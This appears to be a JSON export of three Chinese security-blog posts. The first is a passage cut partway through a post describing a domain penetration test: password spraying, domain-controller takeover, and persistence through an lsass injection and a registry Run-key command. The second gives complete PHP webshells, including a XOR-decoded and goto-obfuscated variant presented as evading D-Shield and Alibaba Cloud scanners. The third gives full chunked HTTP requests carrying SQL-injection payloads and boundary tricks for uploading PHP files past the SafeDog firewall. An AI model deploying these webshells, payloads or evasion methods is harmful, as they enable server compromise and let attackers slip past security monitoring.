\n\n内网横向（因为自己失误造成了比较繁琐的过程）因为前期已经看到了域管的账号就是mqd.tdv，这里直接做密码喷洒，这里转到msf中看下。上线了如此多的主机，同时，DC2子域控也进行了上线\n第一天上线的主机：(MSF上)\nCS上：（上线74台）\n小插曲：因为渗透到域控的时候，在半夜2点半，所以在拿到DC2的权限的时候，就直接关掉电脑睡觉啦，没有进行留后门和做进程注入，导致第二天上线的时候执行命令出现如下界面。\n这里的意思就是启动新进程的时候，系统无法将当前进程的令牌传递给新进程。也就是无法创建进程，所以只能通过其他方式来进行横向渗透。并且后期发现该域管理员密码已经进行修改。\nDC挂掉之后的想到的几种方式：（1）抓去已控主机的hash看是否有其他域管登陆（失败）因为前面已经拿到了100多台机子的权限，所以能想到的第一个思路就是把100多台主机上的hash都进行一个抓起取，然后看是否可以抓到域管的账号，但是这里抓完之后会发现，没有一台域管是上线的，所以这里也比较无语。\n\n（2）利用CVE漏洞来进行横向（失败）因为之前探测到DC的版本是windows2012 R2版本，所以想到了用ms17-010来进行内网横向，但是这里经过检测之后发现也没有ms17-010的漏洞，所以无法进行横向\n\n（3）利用CVE漏洞来子域控（CVE-2020-1472）（失败）这里经过尝试CVE-2020-1472漏洞，也没有发现可以横向上去，通过poc检测发现是fail的。\n\n（4）尝试攻击exchange服务器，来中继攻陷主机（失败）这里就不放细节了，均以失败告终。\n峰回路转：（DC2子域控上线）DC2子域控上线过程：这里经过一天的折磨之后发现，以上的几种方式不好使，但是想到了抓取机器用户的hash，通过构造密码表，来进行域管的密码喷洒，这里抓取了100多个的机器用户和几个域内用户做成密码表，重新进行内网横向。\n这里截图部分域内用户，做成密码表后直接进行喷洒，发现域管成功上线。\n\n\n\nDC2子域权限维持：（1）把当前进程注入到lsass进程中去。\n（2）reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"start\" /d \"C:\\Windows\\Temp\\start.exe\"  //开机自启动\n（3）添加域管理员，因为已经拿到域管理员的权限，所以可以添加域管理员，来进行权限维持（这里直接通过lstar的插件来进行域管理员的添加）\n\n其他域控上线这里也是一个小Tip，也是提供给大家的一个思路\n在有权限的情况下，可以添加域管理员，然后通过域管理员来进行横向其他域控（这是仅限于一个域），但是上面给出来了结构，这个域都是在一个域内的，所以的话，就可以进行添加管理员来上线。这里直接放后期上线的域控。\n\n总结：经过这次实战总结了很多小的技巧。\n（1）可以通过添加域管理员来上线域内的所有主机\n（2）可以通过cs来进行进程注入or进程迁移，来实现本机system权限的获取\n（3）此次实战的密码喷洒尤为重要，所以有机器用户的hash一定要进行抓取\n（4）SPN服务横向可以通过打邮服来进行获取域控权限\n（5）学习了权限维持的方法（开机自启动、winrm的横向和psexec的横向）\n\n恶补了一大波内网知识（比靶场来的实在）\n\n不足之处：\n（1）此次通过内网渗透，虽然打了邮件服务器，但是没有通过邮件服务器来拿下DC的权限。\n（2）没有通过SPN票据横向拿下对应的服务器，比如MSSQL的和CIFS的\n（3）此次没有利用白银票据进行横向（得重新学习）\n","slug":"关于某次授权的大型内网渗透测试","date":"2023-05-24T02:43:26.000Z","categories_index":"","tags_index":"内网渗透","author_index":"Q16G"},{"id":"0bde8e350134ac3c0961afd29aadf7f8","title":"phpwebshell免杀","content":"AntSword0x00 前言：为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可以进行连接，还可以自定义编码器和解码器，可以很容易让流量做到混淆。\n0x01 蚁剑介绍及其改编：关于蚁剑的介绍，这里就不多说了，一个连接webshell的管理器，使用前端nodejs进行编码。AntSword给我最大的好处是可以连接一句话木马，而且可以自定义编码器和解码器。这让我们就有了很多种webshell的变换。\n但是，蚁剑默认的编码器和菜刀都是一样的，这里用burpsuite来进行抓包看下流量。\n蚁剑默认流量返回来的是默认蚁剑的默认流量，所以的话，这里就基本上过不去态势感知和waf，所以很容易想到了编码器和解码器的选择，可以进行流量的改造来进行waf的绕过，先选用最默认的base64进行测试。\n默认的base64编码器但是看到了使用base64编码之后是有eval字样的，这样的话，肯定被态势感知和全流量一体机来进行特征的抓取，肯定会报威胁。\n去github上找到蚁剑的编码器和对应的解码器github地址:（编码器）这里下载默认的aes-128的默认流量。\n默认编码器的webshell\n&lt;?php\n@session_start();\n$pwd='ant';\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));\n?>\n\n默认webshell讲解：这里打开session_start，然后截取Cookie中的PHPSESSION的16位。\n然后进行aes加密，密码为pwd\n\n再D盾，河马和阿里云进行扫描：\n河马没有查出来，可能是比较弱阿里云直接报恶意\n\n初步修改后的webshell：&lt;?php\n@session_start();\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\nfunction decode($key,$data)&#123;\n$data_new = '';\nfor($i=0;$i&lt;=strlen($data);$i++)&#123;\n$b=$data[$i]^$key;\n$data_new = $data_new.urldecode($b);\n&#125;\ndefine('ass',$data_new[0].strrev($data_new)[2].strrev($data_new)[2].$data_new[11].strrev($data_new)[4].strrev($data_new)[0]);\ndefine('ev',$data_new[11].strrev($data_new)[8].$data_new[0].strrev($data_new)[6].'($result)');\nreturn $data_new;\n&#125;\nfunction decrypto($key,$data)&#123;\n$data = base64_decode($data);\n$result = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);\ndecode('\\\\','=:=om>n?o8h9i:j;k*d0e.l/m(');\n$ass=ass;\n$ass(ev);\n&#125;\nclass run&#123;\n    public $data;\n    public function __construct()&#123;\n$this->data = '#````````#'.$_POST[1].\"#`#`#\";\n$this->data = $this->data.\"123456\";\n&#125;\n&#125;\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n$run = new run();\ndecrypto($key,$run->data);\n?>\n\n这里能过去D盾，但是无法绕过阿里云查杀。\n所以这里还需要进行代码混淆。（这也是之后webshell免杀常常用到的）\n混淆之后的webshell：这里提供php在线加密的站\nhttps://enphp.djunny.com/\n\n这里加密之后生成webshell。如下：\ngoto Zc4oD; UJih6: function decrypto($key, $data) &#123; goto LBrqg; P6YrI: $ass = ass; goto aR6yN; svn0O: $result = openssl_decrypt($data, \"\\x41\\x45\\x53\\x2d\\x31\\x32\\70\\55\\105\\x43\\x42\", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING); goto ATbMy; LBrqg: $data = base64_decode($data); goto svn0O; ATbMy: decode(\"\\x5c\", \"\\75\\72\\x3d\\157\\x6d\\x3e\\x6e\\x3f\\x6f\\x38\\x68\\71\\151\\x3a\\x6a\\x3b\\x6b\\x2a\\x64\\x30\\x65\\56\\x6c\\57\\155\\50\"); goto P6YrI; aR6yN: $ass(ev); goto k6RVH; k6RVH: &#125; goto DGZMG; WvjFi: ini_set(\"\\144\\151\\x73\\160\\x6c\\x61\\x79\\x5f\\145\\162\\x72\\x6f\\162\\x73\", \"\\117\\146\\x66\"); goto Wguwk; DGZMG: class run &#123; public $data; public function __construct() &#123; $this->data = \"\\43\\140\\x60\\140\\140\\x60\\140\\x60\\x60\\43\" . $_POST[1] . \"\\x23\\140\\x23\\140\\43\"; &#125; &#125; goto Berxy; UUYvT: $run = new run(); goto apKNY; Berxy: $key = @substr(str_pad(session_id(), 16, \"\\141\"), 0, 16); goto UUYvT; Zc4oD: @session_start(); goto WvjFi; Wguwk: function decode($key, $data) &#123; goto LGJR3; Ef77S: $i = 0; goto KvZGg; rSTXM: define(\"\\141\\x73\\x73\", $data_new[0] . strrev($data_new)[2] . strrev($data_new)[2] . $data_new[11] . strrev($data_new)[4] . strrev($data_new)[0]); goto TQ6r4; Tbglr: return $data_new; goto FsE2S; tm2qt: goto I39OV; goto eF7jG; AqTZZ: $data_new = $data_new . urldecode($b); goto FriN_; TQ6r4: define(\"\\x65\\166\", $data_new[11] . strrev($data_new)[8] . $data_new[0] . strrev($data_new)[6] . \"\\50\\x24\\x72\\145\\163\\165\\154\\x74\\51\"); goto Tbglr; FriN_: bLexq: goto gITff; eF7jG: RuTl1: goto rSTXM; gITff: $i++; goto tm2qt; KdSCg: if (!($i &lt;= strlen($data))) &#123; goto RuTl1; &#125; goto d9N4J; d9N4J: $b = $data[$i] ^ $key; goto AqTZZ; LGJR3: $data_new = ''; goto Ef77S; KvZGg: I39OV: goto KdSCg; FsE2S: &#125; goto UJih6; apKNY: decrypto($key, $run->data);\n\n经过加密之后，可以发现，进行了goto的混淆，所以这里就达到了代码混淆。因为之前绕过了D盾和河马，这里直接去阿里云查杀。\n已经成功绕过阿里云查杀。用burpsuite抓下流量特征。\n从流量加密来分析的话，已经能绕过态势感知和全流量分析机。\n蚁剑UA头的修改：在burp的数据包中能清楚的看到蚁剑的特征\n在目录&#x2F;modules&#x2F;request.js文件中修改UA头\n&#x2F;modules&#x2F;update.js文件修改\n0x03 总结：关于免杀来说，通常是进行代码加密混淆，特征码替换或者分割传输等情况。之前有想写过shellcode免杀，但是还没有过windows defender，所以就推迟一段时间来写。感谢各位拜读。\n","slug":"phpwebshell免杀","date":"2023-05-24T02:40:14.000Z","categories_index":"","tags_index":"免杀","author_index":"Q16G"},{"id":"cf78fa225b6de7abf9eac61bd71ce650","title":"waf绕过-打狗棒法","content":"0x01 前言某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n\n环境的搭建：环境的搭建就选择phpstudy2018+安全狗最新版(2022年10月23日前)\nTip：\n  （1）记得先在phpstudy的Apache的bin目录下初始化Apache服务，一般来说，第一次为询问是否确认，第二次为确认安装（命令：httpd.exe -k install -n apache2.4  用管理员打开）\n  （2）上传防护中把完整的post包过滤勾选上。\n\n0x02 HTTP补充：分块传输的介绍：分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-Encoding: chunked 就表示整个response将使分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。\n请求头Transfer-encoding：官方文档:\n告知接收方为了可靠地传输报文，已经对其进行了何种编码。\n\nchunked编码，使用若干个chunk串连接而成，由一个标明长度为0的chunk表示解释，每个chunk分为头部和正文两部分，头部内容定义了下一行传输内容的个数（个数用16进制来进行表示）和数量（一般不写数量，但是为了混淆，这里还是把数量写上去）正文部分就是指定长度的实际内容。两部分之间用(CRLF)来隔开，在最后一个长度为0的chunk中表示结束。并且长度中是以;作为长度的结束\n数据包中添加：Transfer-Encoding: chunked\n数字代表下一行的字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车\n\n当设置这个Transfer-Encoding请求头的时候，会有两个效果：\nContent-length字段自动忽略\n基于长久化持续推送动态内容（不太了解，但是第三感觉有研究内容）\n\n\nHTTP持久化连接：因为现在大多数是http1.1协议版本，所以的话，只在Transfer-Encoding中定义了chunked一种编码格式。\n持久化连接：\n  Http请求是运行在TCP连接上的，所以自然有TCP的三次握手和四次挥手，慢启动的问题，所以为了提高http的性能，就使用了持久化连接。持久化连接在《计算机网络》中有提及。\n\n  在Http1.1的版本中规定了所有连接默认都是持久化连接，除非在请求头上加上Connection：close。来关闭持久化连接。\n\nContent-Type介绍：Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP的协议消息头中，使用Content-Type来表示请求和响应中的媒体数据格式标签，用于区分数据类型。常见Content-Type的格式如下：\nContent-Type: text/html;\nContent-Type: application/json;charset:utf-8;\nContent-Type：type/subtype ;parameter\nContent-Type：application/x-www-form-urlencoded\nContent-Type：multipart/form-data\n\n重点介绍multipart&#x2F;form-data：当服务器使用multipart&#x2F;form-data接收POST请求的时候，服务器如何知道开始位置和结束位置的呢？？？其中就是用了boundary边界来进行操作的。\nwaf绕过的思路：正常传输的payload都是可以被waf的正则匹配到的，而进行分块传输之后的payload，waf的正则不会进行匹配，而又满足http的规则，所以就能绕过waf。\n例如：正常传输过程中是这样的。那分块传输之后，就变成了这样。\nPOST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 128\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n4\nunam\n1\ne\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\npass\n2\nwd\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\nsubm\n2\nit\n1\n=\n4\nSubm\n2\nit\n0\n\n\n说明是可以识别分块传输的东西，那么我们就可以构造payload来看是否可以绕过waf。\n绕过安全狗的sql注入：这里先解决一下绕过安全狗的方式，在常见的方式中，我们都采用垃圾字符填充的方式来绕过安全狗，虽然效果很好，但是较为复杂，也容易出现被狗咬伤的情况，所以为了解决这一现状，小秦同学翻阅之后发现了分块传输的方式来绕过安全狗。但是分块传输目前来看只能适用于post请求。get请求还是比较难说。\n以sql-labs为例：在sqli-labs的第十一关，我们发现了可以用post请求。先正常看看过滤哪些字符，这里开门见山，直接把’union select (database()),2#。这个东西进行了过滤咱们可以尝试使用分块传输的方式来进行绕过。这里在请求头中添加。\nTransfer-Encoding: chunked\n这个东西，然后进行分块即可。\n\n读取数据库名POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 251\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n4\nname\n1\n=\n1\n&amp;\n2\npa\n4\nsswd\n1\n=\n3\n%27\n2\nun\n1\ni\n2\non\n1\n+\n2\nse\n1\nl\n2\nec\n1\nt\n1\n+\n3\n%28\n2\nda\n1\nt\n2\nab\n1\na\n2\nse\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n3\nsub\n3\nmit\n1\n=\n3\nSub\n3\nmit\n0\n\n\n读取表名：POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 619\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n2\nna\n1\nm\n1\ne\n1\n=\n1\n&amp;\n2\npa\n2\nss\n2\nwd\n1\n=\n3\n%27\n1\nu\n2\nni\n1\no\n1\nn\n1\n+\n2\nse\n2\nle\n1\nc\n1\nt\n1\n+\n3\n%28\n2\nse\n1\nl\n1\ne\n2\nct\n1\n+\n2\ngr\n2\nou\n1\np\n1\n_\n2\nco\n2\nnc\n2\nat\n3\n%28\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nna\n2\nme\n3\n%29\n1\n+\n2\nfr\n2\nom\n1\n+\n2\nin\n2\nfo\n1\nr\n3\nmat\n2\nio\n1\nn\n1\n_\n2\nsc\n3\nhem\n1\na\n1\n.\n2\nta\n2\nbl\n2\nes\n1\n+\n2\nwh\n2\ner\n1\ne\n1\n+\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nsc\n2\nhe\n1\nm\n1\na\n3\n%3D\n2\nda\n1\nt\n2\nab\n3\nase\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n2\nsu\n3\nbmi\n1\nt\n1\n=\n2\nSu\n4\nbmit\n0\n\n\n读列名：\n读取数据：\n绕过安全狗的文件上传（以pikachu靶场为例这里上面讲到了分块传输，这里直接先使用分块传输来进行绕过。这里讲下计算方式，因为文件上传不像sql注入那样单行，所以文件上传是会有回车和空格的计算，（一个回车和一个空格占两个字符）。例如下图：红框中的部分，分别处于不同的行，所以需要传入回车，所以这部分就应该是：这块先去上传php文件为例，可以进行分块传输的构造。然后上传。发现单单的分块传输已经不能绕过安全狗文件上传的检测了。\nContent-Type中的boundary边界混淆绕过因为上面讲到了Content-Type类型，那么对于我们来说，文件上传一定是利用了Content-Type中的multipart&#x2F;form-data来进行的文件上传操作，刚才讲到了利用multipart&#x2F;form-data必须用boundary边界来进行限制，那么我们这里研究一下boundary边界的一些问题。\n深入研究boundary边界问题：这里拿上面的边界来做文章，这里看到了，当上面定义了boundary&#x3D;—-WFJAFAOKAJNFKLAJ的时候我想到了两个问题。\n1.如果有两个boundary是取前一个还是后一个？\n2.boundary结束标志必须和定义的一定相同嘛？\n\n下面继续一一测试\n\nboundary边界问题fuzz：boundary边界一致：\nboundary结束标志不一致：\nboundary开始标志不一致：上面经过研究可以发现boundary结束标志不影响判断。\n多个boundary：\n所以当定义两个boundary的时候，只有第一个起作用。经过了上面的测试发现，我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里进行测试。\n多个boundary混淆：这里进入uploads&#x2F;1.php查看\n成功绕过waf。\n发现：这里发现，其他不用非得加boundary混淆，测到boundary后面加分号就直接可以绕过安全狗来上传成功。\n对于分块传输的小Tip：(1)分块传输的每个长度以;结尾，所以可以构造1;fjaojafjao这种来干扰waf\n(2)分块传输的时候是不会管Content-Length的长度，所以可以通过Content-Length的长度变换来绕过某些waf\n(3)分块传输只是适用于post请求，这也是存在的弊端问题\n\n总结：绕过waf的方式多种多样，但是越简单的方式越需要底层的探索，所以底层的学习是非常必要的。希望给正在学习绕waf的小伙伴提供一些思路。而不仅限于垃圾字符填充。\n参考文献：https://zhuanlan.zhihu.com/p/465948117\nhttp://t.zoukankan.com/liujizhou-p-11802189.html\nhttps://copyfuture.com/blogs-details/202203261638435585\n\n","slug":"waf绕过-打狗棒法","date":"2023-05-24T02:37:22.000Z","categories_index":"","tags_index":"waf绕过","author_index":"Q16G"}]